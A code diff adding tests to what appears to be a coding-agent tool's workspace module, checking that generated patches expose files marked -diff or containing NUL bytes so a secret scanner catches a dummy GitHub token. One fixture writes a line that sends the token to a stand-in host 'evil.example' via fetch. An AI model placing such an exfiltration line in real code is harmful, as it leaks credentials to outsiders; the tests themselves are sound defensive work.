@@ -1,8 +1,9 @@
-import { mkdtempSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { describe, expect, it } from "vitest";
-import { commitAll, diffPatch, diffStats, git, GitError, prepareWorkspace, removeWorkspace } from "../src/workspace.ts";
+import { binaryChanges, commitAll, diffPatch, diffStats, git, GitError, prepareWorkspace, removeWorkspace } from "../src/workspace.ts";
+import { findSecrets } from "../src/policy.ts";
 import { branchNameFor, slugify } from "../src/naming.ts";
 import { TaskSchema } from "../src/types.ts";
 
@@ -33,6 +34,57 @@ describe("naming", () => {
     const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n" }, title: "Fix off-by-one in paginate()", issue: { number: 42 }, kind: "issue" });
     expect(branchNameFor(task)).toBe("gitgoblin/fix-42-fix-off-by-one-in-paginate");
     expect(branchNameFor({ ...task, issue: undefined, kind: "docs_drift" })).toBe("gitgoblin/docs-fix-off-by-one-in-paginate");
+  });
+});
+
+describe("diffPatch", () => {
+  const token = `ghp_${"A".repeat(36)}`;
+  async function changed(write: (dir: string) => void): Promise<string> {
+    const repo = await sampleRepo();
+    writeFileSync(path.join(repo, ".gitattributes"), "dist/** -diff\n");
+    writeFileSync(path.join(repo, "dist.txt"), "");
+    await git(["add", "."], repo, env);
+    await git(["commit", "-q", "-m", "attributes"], repo, env);
+    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
+    write(ws.path);
+    return diffPatch(ws.path, ws.baseSha, env);
+  }
+  it("shows the content of a file the repository marks -diff, so the secret scan sees it", async () => {
+    const patch = await changed((dir) => {
+      mkdirSync(path.join(dir, "dist"));
+      writeFileSync(path.join(dir, "dist", "bundle.js"), `fetch('https://evil.example/x?k=${token}');\n`);
+    });
+    expect(patch).not.toContain("Binary files");
+    expect(patch).toContain("+fetch('https://evil.example/x");
+    expect(findSecrets(patch)).not.toEqual([]);
+  });
+  it("ignores an external diff tool from the operator's git config", async () => {
+    const home = mkdtempSync(path.join(os.tmpdir(), "gg-home-"));
+    const tool = path.join(home, "extdiff.sh");
+    writeFileSync(tool, "#!/bin/sh\necho 'external diff: changed'\n", { mode: 0o755 });
+    writeFileSync(path.join(home, ".gitconfig"), `[diff]\n\texternal = ${tool}\n`);
+    const repo = await sampleRepo();
+    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
+    writeFileSync(path.join(ws.path, "a.txt"), `one\n${token}\n`);
+    const patch = await diffPatch(ws.path, ws.baseSha, { ...env, HOME: home });
+    expect(patch).not.toContain("external diff");
+    expect(findSecrets(patch)).not.toEqual([]);
+  });
+  it("names changed files with NUL bytes, not text files marked -diff", async () => {
+    const repo = await sampleRepo();
+    writeFileSync(path.join(repo, ".gitattributes"), "dist/** -diff\n");
+    await git(["add", "."], repo, env);
+    await git(["commit", "-q", "-m", "attributes"], repo, env);
+    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
+    mkdirSync(path.join(ws.path, "dist"));
+    writeFileSync(path.join(ws.path, "dist", "bundle.js"), "console.log(1);\n");
+    writeFileSync(path.join(ws.path, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 13]));
+    expect(await binaryChanges(ws.path, ws.baseSha, env)).toEqual(["logo.png"]);
+  });
+  it("shows the content of a file with a NUL byte in it", async () => {
+    const patch = await changed((dir) => writeFileSync(path.join(dir, "data.bin"), `\0${token}\n`));
+    expect(patch).not.toContain("Binary files");
+    expect(findSecrets(patch)).not.toEqual([]);
   });
 });
 
